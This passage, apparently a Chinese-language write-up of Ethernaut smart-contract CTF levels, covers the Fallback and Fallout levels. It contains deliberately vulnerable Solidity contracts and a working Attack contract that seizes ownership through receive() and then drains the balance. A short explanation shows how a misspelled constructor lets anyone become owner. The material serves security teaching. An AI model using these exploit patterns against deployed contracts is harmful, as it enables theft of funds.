

# Fallback

## 漏洞代码

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {

  mapping(address => uint) public contributions;
  address public owner;

  constructor() {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    payable(owner).transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}
```

## 目标

Look carefully at the contract's code below.

You will beat this level if

1. you claim ownership of the contract   获取合约的所有权
2. you reduce its balance to 0  窃取所有余额

 Things that might help

- How to send ether when interacting with an ABI
- How to send ether outside of the ABI
- Converting to and from wei/ether units (see `help()` command)
- Fallback methods

## 分析&攻击

结合合约代码和目标看，withdraw()可以提取所有余额，但是用onlyOwner修饰过，只允许owner调用，因此只需要让owner变成我们自己就能达到两个目标。总共三个修改这个变量的地方，constructor()、contribute()和receive()

（1）constructor()是构造函数，我们调用不了；

（2）contribute()是public，可以调用，但是有条件，贡献的币必须比原有owner贡献的高，然而owner部署合约的时候就贡献了1000eth，每次贡献的msg.value还被限制必须 < 0.001 ether，所以要走到if(contributions[msg.sender] > contributions[owner])，得调用1000/0.001次contribute，显然不行

（3）receive()是收到转账是触发，满足msg.value > 0 && contributions[msg.sender] > 0就能让owner = msg.sender;

因此先贡献一点点eth，然后给漏洞合约转账，就能满足这个条件

攻击合约代码：

```
contract Attack{
    Fallback public fb; // Fallback合约地址

    // 初始化Fallback合约地址
    constructor(Fallback _fb) payable {
        fb = _fb;
    }
    // 先贡献然后转钱 要满足require(msg.value > 0 && contributions[msg.sender] > 0);这个条件
    function contributeIt() external payable{
        fb.contribute{value:1}();
    }
    function attackIt() external payable{
        //fb.contribute{value:1}();
        (bool isSuccess, /* memory data */ ) = payable(address(fb)).call{value: 1 wei}("");
        require(isSuccess, "Failure! Ether not send.");
    }
    //最后窃取漏洞合约所有的币
    function withdrawIt() external payable{
        fb.withdraw();
    }
    receive() external payable {
        
    }
}
```

我们用remix简单测试下

先用第一个账户部署Fallback合约

![image-20240328094234694](README.assets/image-20240328094234694.png)

可以看到当前owner是0x5B38Da6a701c568545dCfcB03FcB875f56beddC4这个账户，贡献值很高

![image-20240328094316267](README.assets/image-20240328094316267.png)

此时记住Fallback合约的地址（0xDA0bab807633f07f013f94DD0E6A4F96F8742B53），然后用第二个账户部署Attack合约，给第二个合约打点初始资本（这里给了10000wei），用于后面给Fallback合约做贡献

![image-20240328094434841](README.assets/image-20240328094434841.png)

先满足第一个条件，让贡献值大于0

![image-20240328094614594](README.assets/image-20240328094614594.png)

然后执行attackIt

![image-20240328094649614](README.assets/image-20240328094649614.png)

可以看到owner已经变成我们attack合约的地址了，然后执行withdrawIt就能提取所有贡献的币

![image-20240328095055376](README.assets/image-20240328095055376.png)

# Fallout

## 漏洞代码

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
//import 'openzeppelin-contracts-06/math/SafeMath.sol';
//这里修改了一下，上面的导入方式remix貌似不识别
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol";

contract Fallout {
  
  using SafeMath for uint256;
  mapping (address => uint) allocations;
  address payable public owner;


  /* constructor */
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }

  modifier onlyOwner {
	        require(
	            msg.sender == owner,
	            "caller is not the owner"
	        );
	        _;
	    }

  function allocate() public payable {
    allocations[msg.sender] = allocations[msg.sender].add(msg.value);
  }

  function sendAllocation(address payable allocator) public {
    require(allocations[allocator] > 0);
    allocator.transfer(allocations[allocator]);
  }

  function collectAllocations() public onlyOwner {
    msg.sender.transfer(address(this).balance);
  }

  function allocatorBalance(address allocator) public view returns (uint) {
    return allocations[allocator];
  }
}
```

![image-20240328103103592](README.assets/image-20240328103103592.png)

## 分析&攻击

目标和fallback一样 获取所有权

合约名是Fallout  但是构造函数时Fal1out 写错了，因此可以直接调用Fal1out

因此随便换个人执行下fal1out就能改变owner

![image-20240328104722351](README.assets/image-20240328104722351.png)

# Coin Flip
